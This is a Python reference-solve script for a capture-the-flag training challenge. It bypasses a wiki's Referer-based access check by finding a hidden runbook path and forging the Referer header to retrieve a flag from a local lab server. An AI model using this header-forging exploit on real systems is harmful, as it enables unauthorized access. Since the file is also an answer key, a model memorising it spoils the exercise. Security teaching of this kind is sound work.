#!/usr/bin/env python3
"""Reference exploit for auth2 (Harbor Wiki).

The internal runbook page gates on the client-supplied Referer header
instead of a real session. The staff-home link is a real <a href>; the
runbook's address is deliberately NOT a link on that page (just mentioned
in its text), so a normal click-through never reaches it -- this reference
solve has to read the path out of the page text, not just follow an href,
same as a student would. We confirm the runbook rejects an unforged
request, then forge the Referer header to reach it directly.
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8061")


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def find_href(html: str, text_hint: str) -> str | None:
    m = re.search(r'href="([^"]+)"[^>]*>\s*' + re.escape(text_hint), html, re.I)
    return m.group(1) if m else None


def find_mentioned_path(html: str) -> str | None:
    """A path named in the page's own text, not as a clickable link --
    e.g. `<code>/wiki/internal/ops-runbook</code>`. No href to follow here;
    read the content like a student would."""
    m = re.search(r"<code>(/[\w/-]+)</code>", html)
    return m.group(1) if m else None


def main() -> int:
    s = requests.Session()
    wait_up(s)

    landing = s.get(BASE, timeout=5).text
    staff_home = find_href(landing, "staff home")
    if not staff_home:
        sys.stderr.write("could not discover the staff-home link\n")
        return 1

    staff_page = s.get(BASE + staff_home, timeout=5).text
    runbook = find_mentioned_path(staff_page)
    if not runbook:
        sys.stderr.write("could not discover the runbook path\n")
        return 1

    # Pre-exploit: a direct, unforged request must NOT return the flag.
    r = s.get(BASE + runbook, timeout=5)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: runbook reachable with no Referer\n")
        return 1

    # Exploit: forge the Referer to claim we came from the staff-home page.
    r = s.get(BASE + runbook, headers={"Referer": BASE + staff_home}, timeout=5)
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
